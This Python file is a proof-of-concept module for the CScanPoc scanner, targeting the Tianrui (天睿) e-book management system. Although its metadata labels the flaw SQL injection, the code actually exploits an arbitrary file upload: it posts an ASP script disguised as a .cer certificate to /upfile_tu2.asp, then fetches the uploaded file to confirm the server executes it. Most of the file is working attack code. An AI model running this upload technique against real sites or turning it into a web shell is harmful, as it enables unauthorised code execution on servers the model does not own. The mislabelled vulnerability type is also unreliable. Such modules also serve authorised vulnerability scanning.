# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Tianrui_0003'  # 平台漏洞编号，留空
    name = '天睿电子图书管理系统系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-22'  # 漏洞公布时间
    desc = '''
        天睿电子图书管理系统是一套阅读书籍系统，基于PHPCMF框架架构，拥有相当强大的内容管理模式和灵活的扩展性能。
        天睿电子图书管理系统系统 /upfile_tu2.asp?id=1 SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0121549'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '天睿电子图书管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '133e54b4-e104-494d-91f4-7c1e46cc72b3'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + '/upfile_tu2.asp?id=1'
            content_type = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryriebpEo5zuOo08zY'
            data = '''------WebKitFormBoundaryriebpEo5zuOo08zY\r
                Content-Disposition: form-data; name="act"\r
                \r
                upload\r
                ------WebKitFormBoundaryriebpEo5zuOo08zY\r
                Content-Disposition: form-data; name="filepath"\r
                \r
                upimg/\r
                ------WebKitFormBoundaryriebpEo5zuOo08zY\r
                Content-Disposition: form-data; name="file1"; filename="test.cer"\r
                Content-Type: application/x-x509-ca-cert\r
                \r
                <%\r
                    a = "WtFhhh"\r
                    b = "HHHwTf"\r
                    Response.Write(a+b)\r
                %>\r
                ------WebKitFormBoundaryriebpEo5zuOo08zY\r
                Content-Disposition: form-data; name="Submit"\r
                \r
                · 提交 ·\r
                ------WebKitFormBoundaryriebpEo5zuOo08zY--\r
                '''
            #proxy = ('127.0.0.1', 8887)
            code, head, res, err, _ = hh.http(
                url, post=data, header=content_type)
            if code != 200:
                return False
            m = re.search(r'=>\s*(upimg/[\d-]*\.cer)\s*', res)
            if not m:
                return False
            verify = arg + m.group(1)
            code, head, res, err, _ = hh.http(verify)
            if(code == 200) and ("WtFhhhHHHwTf" in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
